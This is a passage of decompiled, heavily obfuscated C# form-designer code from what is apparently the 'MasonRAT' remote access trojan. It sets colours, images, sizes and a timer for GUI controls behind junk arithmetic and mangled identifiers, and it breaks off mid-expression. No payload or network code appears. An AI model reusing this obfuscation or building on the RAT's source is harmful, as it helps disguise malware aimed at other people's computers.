\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0 ^ (1431892473 | 801514110) - 2145317885 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0));
    this.\u2694️MasonRAT\u270C\u0020\u0608\u060Fۙﯧژــْـ\u060Dڦ\u0608ب\u060Dٽ\u060F.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270C\u0020\u0608\u060Fۙﯧژــْـ\u060Dڦ\u0608ب\u060Dٽ\u060F.Image = (Image) componentResourceManager.GetObject(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 230));
    this.\u2694️MasonRAT\u270C\u0020\u0608\u060Fۙﯧژــْـ\u060Dڦ\u0608ب\u060Dٽ\u060F.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 231);
    this.\u2694️MasonRAT\u270C\u0020\u0608\u060Fۙﯧژــْـ\u060Dڦ\u0608ب\u060Dٽ\u060F.Size = new Size((-1892010477 - (2065593451 << 423992295) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0 ^ (185116226 > 242326705 ? 18 : 14) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0, 28);
    this.\u2694️MasonRAT\u270C\u0020\u0608\u060Fۙﯧژــْـ\u060Dڦ\u0608ب\u060Dٽ\u060F.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 232);
    this.\u2694️MasonRAT\u270C\u060Dٸڕ\u0609ۡ\u0608ـح\u0609طڙ\u060Fۙڙ\u060Eټـ\u060Aـ.BackColor = Color.FromArgb(((-840554448 ^ 1432721526 << 651225679) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0) - ((-2041549867 ^ -128408121) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0) % (-373746551 - -512628906 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1), (-81756986 - ~81757008 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0 ^ 1140471442 - 1140471429 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 << 1, (1223305223 - ~1998166204 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0) + (-698727472 - -1623055254 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0 | -1748172410 - ~2016360091 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 >> 1));
    this.\u2694️MasonRAT\u270C\u060Dٸڕ\u0609ۡ\u0608ـح\u0609طڙ\u060Fۙڙ\u060Eټـ\u060Aـ.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270C\u060Dٸڕ\u0609ۡ\u0608ـح\u0609طڙ\u060Fۙڙ\u060Eټـ\u060Aـ.Image = (Image) componentResourceManager.GetObject(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 233));
    this.\u2694️MasonRAT\u270C\u060Dٸڕ\u0609ۡ\u0608ـح\u0609طڙ\u060Fۙڙ\u060Eټـ\u060Aـ.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 234);
    this.\u2694️MasonRAT\u270C\u060Dٸڕ\u0609ۡ\u0608ـح\u0609طڙ\u060Fۙڙ\u060Eټـ\u060Aـ.Size = new Size(((153 ^ 21) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0 ^ (56143975 ^ 1796607684 >> 604376133) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 << 1), 28);
    this.\u2694️MasonRAT\u270C\u060Dٸڕ\u0609ۡ\u0608ـح\u0609طڙ\u060Fۙڙ\u060Eټـ\u060Aـ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 235);
    this.\u2694️MasonRAT\u270Cڙ\u060Bـ؁ــ\u060F\u060Aح\u060A\u0608̍\u060A.BackColor = Color.FromArgb(((98876335 ^ 1057983985 % 919652776) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0) - (-958231271 - ~1190654641 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0) % (-854584045 - 2050272931 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 << 1), ((4833053 ^ 1237254927 >> 1188057096) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0 ^ 1183912129 - 1183912125 % 1898770713 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0), ((338598711 ^ 996409558 << 1766864606) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0 ^ ~((1808884971 ^ 9) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 >> 1));
    this.\u2694️MasonRAT\u270Cڙ\u060Bـ؁ــ\u060F\u060Aح\u060A\u0608̍\u060A.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270Cڙ\u060Bـ؁ــ\u060F\u060Aح\u060A\u0608̍\u060A.Image = (Image) componentResourceManager.GetObject(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 236));
    this.\u2694️MasonRAT\u270Cڙ\u060Bـ؁ــ\u060F\u060Aح\u060A\u0608̍\u060A.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 237);
    this.\u2694️MasonRAT\u270Cڙ\u060Bـ؁ــ\u060F\u060Aح\u060A\u0608̍\u060A.Size = new Size((-334643462 - (1579884440 << 1152341178) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0) - -(1024424694 + 920831661 % 1845703330 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0), 28);
    this.\u2694️MasonRAT\u270Cڙ\u060Bـ؁ــ\u060F\u060Aح\u060A\u0608̍\u060A.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 238);
    this.\u2694️MasonRAT\u270Cٺ\u060Dۙﻋ\u0609\u0609\u060Cּ\u060Dٽڙءﮪټڟ̍ۙ\u060D\u0608ة.BorderStyle = BorderStyle.FixedSingle;
    this.\u2694️MasonRAT\u270Cٺ\u060Dۙﻋ\u0609\u0609\u060Cּ\u060Dٽڙءﮪټڟ̍ۙ\u060D\u0608ة.Location = new Point(((-1400415974 ^ 10) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0 ^ -27278345 - ~1013494166 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0 << (1745774035 ^ (1670804663 | 1208055269)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0), 328);
    this.\u2694️MasonRAT\u270Cٺ\u060Dۙﻋ\u0609\u0609\u060Cּ\u060Dٽڙءﮪټڟ̍ۙ\u060D\u0608ة.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 239);
    this.\u2694️MasonRAT\u270Cٺ\u060Dۙﻋ\u0609\u0609\u060Cּ\u060Dٽڙءﮪټڟ̍ۙ\u060D\u0608ة.Size = new Size((-514339109 - 647870848 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0) + ((1162210177 ^ 12) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0) % (~1406196371 - 1521667523 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << -0, 139);
    this.\u2694️MasonRAT\u270Cٺ\u060Dۙﻋ\u0609\u0609\u060Cּ\u060Dٽڙءﮪټڟ̍ۙ\u060D\u0608ة.SizeMode = (PictureBoxSizeMode) ((91548595 - (882745272 >> 1261742061) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0 ^ (-1113638806 - ~1205079640 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0) % (540204914 - ~821982232 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 + 0);
    this.\u2694️MasonRAT\u270Cٺ\u060Dۙﻋ\u0609\u0609\u060Cּ\u060Dٽڙءﮪټڟ̍ۙ\u060D\u0608ة.TabIndex = -1348052448 - 1924012441 % 357473163 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0 - ~(380274000 + 1104425082 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1);
    this.\u2694️MasonRAT\u270Cٺ\u060Dۙﻋ\u0609\u0609\u060Cּ\u060Dٽڙءﮪټڟ̍ۙ\u060D\u0608ة.TabStop = false;
    this.\u2694️MasonRAT\u270C\u060Dةـ\u060Fڠۧـڙٺئۙﻋ.Enabled = true;
    this.\u2694️MasonRAT\u270C\u060Dةـ\u060Fڠۧـڙٺئۙﻋ.Interval = (-702855333 - 1730644547 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0 > 353941161 + 1209554296 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0 ? 68748881 - 68747881 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0 : (1331 ^ 6) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0 + 0;
    this.\u2694️MasonRAT\u270C\u0608ۙ؁ڣ\u060E\u0609ڙּڙٽ\u060Dــؤڟـ̍.TargetControl = (Control) this;
    this.\u2694️MasonRAT\u270Cۚٺۏڕﻼ\u0608ــڅ\u0609ـ\u060Dــ\u060Bءـ\u060A.Controls.Add((Control) this.\u2694️MasonRAT\u270Cـ\u0608ټـبؤـ؁\u060Aۏﮪ\u060Cـ);
    this.\u2694️MasonRAT\u270Cۚٺۏڕﻼ\u0608ــڅ\u0609ـ\u060Dــ\u060Bءـ\u060A.Controls.Add((Control) this.\u2694️MasonRAT\u270Cۙ\u0608ة\u0608\u0608\u060Cﻋ\u0609ــ\u060A\u060Aڕ);
    this.\u2694️MasonRAT\u270Cۚٺۏڕﻼ\u0608ــڅ\u0609ـ\u060Dــ\u060Bءـ\u060A.Controls.Add((Control) this.\u2694️MasonRAT\u270Cڜب\u060Dبـٻـحـــ\u060Cدـٸ\u060Aٺ\u060Aـ\u0608);
    this.\u2694️MasonRAT\u270Cۚٺۏڕﻼ\u0608ــڅ\u0609ـ\u060Dــ\u060Bءـ\u060A.Controls.Add((Control) this.\u2694️MasonRAT\u270Cـــٺ\u0608\u060Bئحى\u060B\u060Aۙۙـؤۙڦ);
    this.\u2694️MasonRAT\u270Cۚٺۏڕﻼ\u0608ــڅ\u0609ـ\u060Dــ\u060Bءـ\u060A.Controls.Add((Control) this.\u2694️MasonRAT\u270Cﮪ\u0609ٺةحڇڜْـــ\u060Bڙـٻ);
    this.\u2694️MasonRAT\u270Cۚٺۏڕﻼ\u0608ــڅ\u0609ـ\u060Dــ\u060Bءـ\u060A.Cursor = Cursors.SizeAll;
    this.\u2694️MasonRAT\u270Cۚٺۏڕﻼ\u0608ــڅ\u0609ـ\u060Dــ\u060Bءـ\u060A.Dock = (DockStyle) (((723535429 | 833370004) - 994824681 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0 ^ -651697812 - 2021783575 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0 >> ((-1861556919 ^ ~1214183646) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 >> 1));
    this.\u2694️MasonRAT\u270Cۚٺۏڕﻼ\u0608ــڅ\u0609ـ\u060Dــ\u060Bءـ\u060A.FillColor = Color.FromArgb((779710867 + (1528228694 | 685007753) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0) + (1542895025 - (105321224 << 1805305792) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0, (869318958 + 435568364 % 690073399 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0) + (851986402 % 433212392 - 71854642 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 << (720969820 - 151960047 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0, ((-2036977157 ^ ~109506993) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0 ^ (107959197 + (561611628 | 1748390207) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0 | -1250577602 - 1995740855 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 << 1));
    this.\u2694️MasonRAT\u270Cۚٺۏڕﻼ\u0608ــڅ\u0609ـ\u060Dــ\u060Bءـ\u060A.FillColor2 = Color.FromArgb(821248608 - 1408442949 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0 + (2008619007 + (1645121239 >> 976588511) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0 << (~1160694949 - 1865723469 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 << 1, ((-577528587 ^ 10) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0 ^ ~(577528587 + 